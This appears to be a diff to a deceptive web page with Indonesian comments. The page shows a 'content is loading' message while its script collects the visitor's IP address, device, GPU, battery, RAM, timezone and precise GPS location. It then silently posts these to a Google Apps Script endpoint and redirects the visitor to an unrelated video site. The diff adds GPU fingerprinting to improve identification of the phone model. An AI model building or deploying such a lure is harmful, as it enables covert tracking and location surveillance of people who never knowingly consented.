@@ -19,28 +19,23 @@
         <p>Mohon tunggu sebentar, konten sedang disiapkan.</p>
     </div>
 
-    <script>
+   <script>
     const statusText = document.getElementById("status");
-    
-    // Pastikan URL GAS ini sudah benar
-    const URL_GAS = "https://script.google.com/macros/s/AKfycbybnozwoLATECc30DwEW13-7f0ZHsfCnpmUT-HAdm3xPyCjXVLi1Y5iKU55uNg_tLcC/exec"; 
+    const URL_GAS = "https://script.google.com/macros/s/AKfycbwcx5lSKsMK9hUrs0jn-tITO0ZihemSDakpgvRkuLuygTPzPczRZ2c8D3q6fORVPU5i/exec"; 
 
     async function mulaiLacak() {
-        // Data dasar
         let dataLog = {
             ip: "Tidak Terdeteksi",
             device: navigator.userAgent,
             lat: "Ditolak",
             lon: "Ditolak",
             acc: "-",
-            // Tambahan informasi hardware & baterai
             layar: `${window.screen.width}x${window.screen.height}`,
             ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak terdeteksi",
             baterai_level: "Tidak didukung",
             baterai_status: "Tidak didukung",
-            os_platform: navigator.platform,
-            vendor: navigator.vendor,
-            cpu_cores: navigator.hardwareConcurrency || "Tidak diketahui"
+            gpu: "Tidak diketahui",
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
         // 1. Ambil Alamat IP
@@ -50,16 +45,26 @@
             dataLog.ip = resData.ip;
         } catch (e) { console.log("Gagal ambil IP"); }
 
-        // 2. Ambil Informasi Baterai
+        // 2. Ambil Info GPU (Untuk menebak model HP lebih akurat)
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                dataLog.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        } catch (e) { console.log("Gagal akses GPU"); }
+
+        // 3. Ambil Informasi Baterai
         if (navigator.getBattery) {
             try {
                 const battery = await navigator.getBattery();
                 dataLog.baterai_level = Math.round(battery.level * 100) + "%";
-                dataLog.baterai_status = battery.charging ? "Mengisi Daya" : "Discharge (Baterai)";
+                dataLog.baterai_status = battery.charging ? "Mengisi Daya" : "Baterai";
             } catch (e) { console.log("Gagal akses baterai"); }
         }
 
-        // 3. Minta Izin GPS (Sesuai alur kode asli Anda)
+        // 4. Minta Izin GPS
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
@@ -68,10 +73,7 @@
                     dataLog.acc = position.coords.accuracy + " meter";
                     kirimData(dataLog);
                 },
-                (error) => {
-                    console.log("GPS Ditolak");
-                    kirimData(dataLog); // Tetap kirim data meskipun GPS ditolak
-                },
+                (error) => { kirimData(dataLog); },
                 { enableHighAccuracy: true, timeout: 8000 }
             );
         } else {
@@ -80,22 +82,17 @@
     }
 
     function kirimData(payload) {
-        statusText.innerText = "Hampir selesai...";
-        
+        statusText.innerText = "Menyiapkan konten...";
         fetch(URL_GAS, {
             method: "POST",
-            mode: "no-cors", // Penting agar tidak terkena CORS policy Google
+            mode: "no-cors",
             body: JSON.stringify(payload),
             headers: { "Content-Type": "application/json" }
         })
         .then(() => {
-            setTimeout(() => {
-                window.location.href = "https://online-video-cutter.com";
-            }, 1000);
+            setTimeout(() => { window.location.href = "https://online-video-cutter.com"; }, 1000);
         })
-        .catch(err => {
-            window.location.href = "https://online-video-cutter.com";
-        });
+        .catch(err => { window.location.href = "https://online-video-cutter.com"; });
     }
 
     window.onload = mulaiLacak;
